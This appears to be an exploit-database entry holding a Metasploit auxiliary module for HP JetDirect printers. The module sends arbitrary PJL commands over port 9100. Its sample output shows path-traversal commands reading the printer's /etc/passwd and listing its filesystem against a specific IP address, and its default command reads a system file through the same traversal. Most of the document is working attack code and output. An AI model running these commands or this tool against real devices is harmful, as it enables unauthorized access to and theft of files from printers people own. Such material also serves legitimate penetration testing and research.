# Exploit Title: HP JetDirect PJL Query Execution
# Date: Aug 7, 2011
# Author: Myo Soe <YGN Ethical Hacker Group - http://yehg.net/>
# Software Link: http://www.hp.com
# Version: All
# Tested on: HP LaserJet Pxxxx Series

##
# $Id: $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


##
# Sample Output:
#
#
# msf auxiliary(hp_printer_pjl_cmd) > show options
#
# Module options (auxiliary/admin/hp_printer_pjl_cmd):
#
#    Name         Current Setting                                           Required  Description
#    ----         ---------------                                           --------  -----------
#    CMD          FSUPLOAD NAME="0:/../../../etc/passwd" OFFSET=0 SIZE=999  yes       PJL Command to run
#    INTERACTIVE  true                                                      no        Enter interactive mode [msfconsole Only]
#    RHOST        202.138.16.21                                             yes       The target address
#    RPORT        9100                                                      yes       The target port
#
# msf auxiliary(hp_printer_pjl_cmd) > run
#
# [*] Entering interactive mode ...
# [*] Please wait while executing -
# [*] FSUPLOAD NAME="0:/../../../etc/passwd" OFFSET=0 SIZE=999
# [+] Server returned the following response:
#
# root::0:0::/:/bin/dlsh
#
#
# [*] Enter PJL Command:
# [*] -> 'quit' to exit
# $ > fsdirlist name="0:/../../../" entry=1 count=99999999
# [*] Please wait while executing -
# [*] fsdirlist name="0:/../../../" entry=1 count=99999999
# [+] Server returned the following response:
#
# . TYPE=DIR
# .. TYPE=DIR
# bin TYPE=DIR
# usr TYPE=DIR
# etc TYPE=DIR
# hpmnt TYPE=DIR
# hp TYPE=DIR
# lib TYPE=DIR
# dev TYPE=DIR
# init TYPE=FILE SIZE=9016
# .profile TYPE=FILE SIZE=834
# tmp TYPE=DIR
#
#
# [*] Enter PJL Command:
# [*] -> 'quit' to exit
# $ > quit
# [*] Exited ... Have fun with your Printer!
# [*] Auxiliary module execution completed
# msf auxiliary(hp_printer_pjl_cmd) >



require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Tcp

	def initialize(info={})
		super(update_info(info,
			'Name'        => 'HP JetDirect Printer PJL Query Execution',
			'Version'     => '$Revision: 1 $',
			'Description'	=> %q{
				This module act as a HP printer PJL (Printer Job Language) query tool that allows you to submit your own PJL commands. Valid PJL commands are required to get successful response. See the reference section for PJL reference guides from HP.
			},
			'Author'      => [
					'Myo Soe <YGN Ethical Hacker Group, http://yehg.net/>'
					],
			'License'     => MSF_LICENSE,
			'References'     =>
			[
				[ 'URL', 'http://h20000.www2.hp.com/bc/docs/support/SupportManual/bpl13208/bpl13208.pdf' ],
				[ 'URL', 'http://h20000.www2.hp.com/bc/docs/support/SupportManual/bpl13207/bpl13207.pdf' ],
				[ 'URL', 'https://secure.wikimedia.org/wikipedia/en/wiki/Printer_Job_Language' ],
				[ 'URL', 'http://core.yehg.net/lab/#tools.exploits' ]

			],
			'DisclosureDate' => ' 2011'))

		register_options(
		[
			OptString.new('CMD',
					[
						true,
						"PJL Command to run",
						'FSUPLOAD NAME="0:/../../../.profile" OFFSET=0 SIZE=999'
					]
				),
			OptBool.new('INTERACTIVE',
								[
									false,
									"Enter interactive mode [msfconsole Only]",
									false
								]
							),

			Opt::RPORT(9100)
		],self.class)


	end

	def run
		mode = datastore['INTERACTIVE']

		if mode	== true
			set_interactive(datastore['CMD'])
		else
			set_onetime(datastore['CMD'])
		end
	end

	def set_interactive(scmd)
		cmd = scmd

		print_status("Entering interactive mode ...")
		stop = false

		set_onetime(cmd)

		until stop == true
			print_status("Enter PJL Command:")
			print_status("-> 'quit' to exit")
			print("$ > ")
			tmp_cmd = ''
			tmp_cmd = gets.chomp.to_s
			if tmp_cmd =~ /quit/
				stop= true
				print_status("Exited ... Have fun with your Printer!")
			else
				set_onetime(tmp_cmd)
			end
		end
	end

	def set_onetime(scmd)

		connect

		cmd = "\x1b%-12345X@PJL [REPLACE]\x0d\x0a\x1b%-12345X\x0d\x0a"
		r_cmd = cmd.sub("[REPLACE]",scmd)

 		print_status("Please wait while executing -")
		print_status("#{scmd}")

		recv = sock.put(r_cmd)
		res = sock.get(-1,1)

		if (!res)
			print_error("ERROR in receiving data!\r\n")
		else
			if res.to_s =~ /ERROR/
				print_error("BAD COMMAND OR ERROR\r\n")
				disconnect
				return
			end
			resx = res.to_s[res.index("\r\n")+1,res.length]
			print_good("Server returned the following response:\r\n#{resx}")
		end

		disconnect

	end


end